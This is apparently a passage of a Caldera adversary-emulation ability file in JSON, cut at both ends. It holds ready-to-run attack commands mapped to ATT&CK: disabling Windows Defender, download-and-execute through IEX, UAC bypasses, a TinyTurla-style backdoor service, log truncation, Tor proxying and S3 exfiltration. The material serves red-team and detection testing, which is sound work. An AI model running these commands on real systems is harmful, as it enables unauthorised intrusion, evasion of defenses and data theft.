Add-MpPreference -ExclusionPath $excludedpath", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "5c4ea84c2b050f1f8b6f880755ccbc62", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender Evade Scanning -Folder", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$excludedProcess = \"outlook.exe\"; Remove-MpPreference -ExclusionProcess  $excludedProcess"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$excludedProcess = \"outlook.exe\"; Add-MpPreference -ExclusionProcess $excludedProcess", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "c407315583b3a00d9a2e0c3c510f2c96", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender Evade Scanning -Process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "43e3334362b140924f001b256b229ee5", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Tamper with Windows Defender Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) ; Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Scheduled Task/Job: Scheduled Task", "ability_id": "920a251237fac2b70fe4d647aa16bfdd", "technique_id": "T1053.005", "tactic": "multiple", "requirements": [], "name": "Task Scheduler via VBA", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'; if(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Remove-Item $file1 -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; $file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"; Start-Process -Wait $file1 /S; Start-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Access Software", "ability_id": "f50ec080343f1bec4e739dd20675c349", "technique_id": "T1219", "tactic": "command-and-control", "requirements": [], "name": "TeamViewer Files Detected Test on Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f && reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "0fa53cacfb86254022a27a050159fa83", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Terminal Server Client Connection History Cleared", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Testing uncommonly used port utilizing telnet.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "telnet google.com 8081", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "telnet google.com 8081", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Non-Standard Port", "ability_id": "6caef6484ad6ecb32eb311c6cd8b7ca6", "technique_id": "T1571", "tactic": "command-and-control", "requirements": [], "name": "Testing usage of uncommonly used port", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful\nport check will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Test-NetConnection -ComputerName google.com -port 8081", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Non-Standard Port", "ability_id": "7f734143338de2b02093a703f919e7fc", "technique_id": "T1571", "tactic": "command-and-control", "requirements": [], "name": "Testing usage of uncommonly used port with PowerShell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the \"Atomic Red Team\" caption after one or two seconds. ", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["26c3b3_InjectContext.exe"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$notepad = Start-Process notepad -passthru; Start-Process 26c3b3_InjectContext.exe; Start-Sleep -Seconds 5; Stop-Process $notepad.id", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Thread Execution Hijacking", "ability_id": "f85556ac016baf1d7938396a6c048166", "technique_id": "T1055.003", "tactic": "multiple", "requirements": [], "name": "Thread Execution Hijacking", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sc stop W64Time && sc.exe delete W64Time && del %systemroot%\\system32\\w64time.dll && reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f && reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy $PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll %systemroot%\\system32\\ && sc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto && sc config W64Time DisplayName= \"Windows 64 Time\" && sc description W64Time \"Maintain date and time synch on all clients and services in the network\" && reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f && reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f && sc start W64Time", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Create or Modify System Process: Windows Service", "ability_id": "d04c129f52b4b6c47582faf785fdb541", "technique_id": "T1543.003", "tactic": "multiple", "requirements": [], "name": "TinyTurla backdoor service w64time", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo systemctl stop tor"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else sudo apt-get -y install tor; fi;  ;  sudo systemctl start tor", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Proxy: Multi-hop Proxy", "ability_id": "a17ba4dfbcf9117ba3fcb935ff91f49c", "technique_id": "T1090.003", "tactic": "command-and-control", "requirements": [], "name": "Tor Proxy Usage - Debian/Ubuntu", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy service will be launched. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["killall tor > /dev/null 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "if [ -x \"$(command -v tor --version)\" ]; then : ; else if [ ! -x \"$(command -v brew --version)\" ]; then /bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)\"; fi; brew install tor; fi;  ;  osascript -e 'tell application \"Terminal\" to do script \"tor\"'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Proxy: Multi-hop Proxy", "ability_id": "8c88994e55a53a5f85b75ecded495ab0", "technique_id": "T1090.003", "tactic": "command-and-control", "requirements": [], "name": "Tor Proxy Usage - MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is designed to launch the tor proxy service, which is what is utilized in the background by the Tor Browser and other applications with add-ons in order to provide onion routing functionality.\nUpon successful execution, the tor proxy will be launched, run for 60 seconds, and then exit. \n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "invoke-expression 'cmd /c start powershell -Command {cmd /c $env:temp\\tor\\Tor\\tor.exe}'; sleep -s 60; stop-process -name \"tor\" | out-null", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Proxy: Multi-hop Proxy", "ability_id": "7a3cf53858c519cfc11eff3c7b813ac9", "technique_id": "T1090.003", "tactic": "command-and-control", "requirements": [], "name": "Tor Proxy Usage - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Transfer the compressed archive from one S3 bucket to another S3 bucket via AWS CLI. It is assumed that the proper\npolicies and security rules are in place to allow reading from the source bucket and writing to the destination\nbucket.\n", "repeatable": false, "privilege": "", "buckets": ["exfiltration"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"exfil-#{paw}-$($SourceFile.name)\";\naws s3 cp s3://#{s3.source.name}/$RemoteName s3://#{s3.destination.name} --acl bucket-owner-full-control;", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Transfer Data to Cloud Account", "ability_id": "ba0deadb-97ac-4a4c-aa81-21912fc90980", "technique_id": "T1537", "tactic": "exfiltration", "requirements": [{"relationship_match": [{"source": "host.dir.compress"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Transfer Compressed Archive to Separate S3 Bucket via AWS CLI", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launch bash shell with command arg to create TRAP on EXIT.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/art-fish.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/art-fish.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" EXIT'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Trap", "ability_id": "7e2dc6c4605119184437dbc8cdb80265", "technique_id": "T1546.005", "tactic": "multiple", "requirements": [], "name": "Trap EXIT", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Launch bash shell with command arg to create TRAP on SIGINT (CTRL+C), then send SIGINT signal.\nThe trap executes script that writes to /tmp/art-fish.txt\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/art-fish.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/art-fish.txt"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "bash -c 'trap \"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\" SIGINT && kill -SIGINT $$'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Trap", "ability_id": "97eb1eb07611c5f98768250b1b705a67", "technique_id": "T1546.005", "tactic": "multiple", "requirements": [], "name": "Trap SIGINT", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "PathToAtomicsFolder\\T1482\\src\\TruffleSnout.exe forest -n %userdomain% && PathToAtomicsFolder\\T1482\\src\\TruffleSnout.exe domain -n %userdomain%", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Domain Trust Discovery", "ability_id": "130bbfbbd1c09a723a3ad848f0ef8da5", "technique_id": "T1482", "tactic": "discovery", "requirements": [], "name": "TruffleSnout - Listing AD Infrastructure", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo truncate -s 0 /var/log/system.log; sudo truncate --size=0 /var/log/system.log", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "68c56ff768d196958e92ebbcb91bc759", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "Truncate system log files via truncate utility", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "fw.disabled"}]}], "cleanup": ["ufw logging low; ufw status verbose"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "ufw logging off", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "c01780a26cb87c321879cb4b8527ee6f", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [{"relationship_match": [{"source": "root"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Turn off UFW logging", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Recurse -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null; New-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null; $Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "64430e7597668877a832b9d1e379c9f2", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UAC Bypass with WSReset Registry Modification", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Determine whether or not UAC is enabled", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo $(get-uac)", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "echo $(get-uac)", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Software Discovery: Security Software Discovery", "ability_id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4", "technique_id": "T1518.001", "tactic": "discovery", "requirements": [], "name": "UAC Status", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Set a registry key to allow UAC bypass", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c", "technique_id": "T1548.002", "tactic": "privilege-escalation", "requirements": [], "name": "UAC bypass registry", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\23 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "c075d43b9dbd82bcbe36e82c7fee318a", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 23", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\31 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "a858f6dce84f8f41306497474cfa952f", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 31", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\33 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "65543e25f0be2d93b572fd6e774a8432", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 33", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\34 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "a55327064e0992e3a12b50328733034d", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 34", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "\"%temp%\\uacme\\39 Akagi64.exe\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control", "ability_id": "8b29cf959638afc0ecc68406e492b197", "technique_id": "T1548.002", "tactic": "multiple", "requirements": [], "name": "UACME Bypass Method 39", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, 